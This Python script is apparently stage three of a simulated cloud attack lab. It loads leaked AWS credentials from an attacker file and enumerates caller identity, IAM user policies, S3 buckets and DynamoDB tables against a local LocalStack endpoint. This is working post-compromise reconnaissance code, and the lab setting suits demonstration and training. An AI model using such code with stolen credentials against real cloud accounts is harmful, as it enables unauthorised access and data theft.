"""STAGE 3 — Privilege escalation / lateral discovery.
Authenticates with the leaked credentials and enumerates what they can access."""
import json
import os

import boto3

ENDPOINT = os.environ.get("LOCALSTACK_ENDPOINT", "http://localhost:4566")
CREDS_FILE = "attacker/.leaked_creds"


def load_creds():
    with open(CREDS_FILE) as f:
        return json.load(f)


def main():
    print("=== STAGE 3: Privilege escalation / lateral discovery ===")
    creds = load_creds()
    session = boto3.session.Session(
        aws_access_key_id=creds["access_key_id"],
        aws_secret_access_key=creds["secret_access_key"],
        region_name="us-east-1",
    )

    sts = session.client("sts", endpoint_url=ENDPOINT)
    identity = sts.get_caller_identity()
    print(f"[+] sts:GetCallerIdentity -> {identity.get('Arn', identity)}")

    iam = session.client("iam", endpoint_url=ENDPOINT)
    try:
        policies = iam.list_user_policies(UserName="leaked-service-user")
        print(f"[+] iam:ListUserPolicies -> {policies.get('PolicyNames')}")
        for name in policies.get("PolicyNames", []):
            doc = iam.get_user_policy(UserName="leaked-service-user", PolicyName=name)
            print(f"    policy '{name}': {doc.get('PolicyDocument')}")
    except Exception as e:
        print(f"[-] iam enumeration failed: {e}")

    s3 = session.client("s3", endpoint_url=ENDPOINT)
    buckets = [b["Name"] for b in s3.list_buckets().get("Buckets", [])]
    print(f"[+] s3:ListBuckets -> {buckets}")

    dynamodb = session.client("dynamodb", endpoint_url=ENDPOINT)
    tables = dynamodb.list_tables().get("TableNames", [])
    print(f"[+] dynamodb:ListTables -> {tables}")

    print("\n[!] This key has far more access than a 'backup service account' should have.")
    print("=== STAGE 3 COMPLETE ===\n")


if __name__ == "__main__":
    main()
